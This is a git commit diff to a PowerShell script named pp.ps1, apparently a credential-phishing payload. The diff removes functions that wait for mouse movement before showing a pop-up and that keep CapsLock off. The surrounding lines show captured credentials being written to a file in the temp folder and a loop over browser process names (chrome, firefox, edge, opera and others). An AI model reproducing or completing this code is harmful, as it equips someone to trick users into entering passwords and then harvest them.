67d0da7ae0b5c644e5effb3e7c4613661e760310
Wesley5n1p35 <47337218+Wesley5n1p35@users.noreply.github.com>
2023-11-08 18:14:03 -0600

    Update pp.ps1

--- pp.ps1
+++ pp.ps1
@@ -28,50 +28,6 @@ $creds | Out-File -FilePath "$env:TEMP\$FileName" -Encoding utf8
 Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase
 
 
-
-function Pause-Script{
-Add-Type -AssemblyName System.Windows.Forms
-$originalPOS = [System.Windows.Forms.Cursor]::Position.X
-$o=New-Object -ComObject WScript.Shell
-
-    while (1) {
-        $pauseTime = 3
-        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
-            break
-        }
-        else {
-            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
-        }
-    }
-}
-
-#----------------------------------------------------------------------------------------------------
-
-# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
-
-function Caps-Off {
-Add-Type -AssemblyName System.Windows.Forms
-$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
-
-#If true, toggle CapsLock key, to ensure that the script doesn't fail
-if ($caps -eq $true){
-
-$key = New-Object -ComObject WScript.Shell
-$key.SendKeys('{CapsLock}')
-}
-}
-#----------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
-#>
-
-Pause-Script
-
-Caps-Off
-
 $browserProcesses = "chrome", "firefox", "iexplore", "edge", "opera"
 
 $browserProcesses | ForEach-Object {
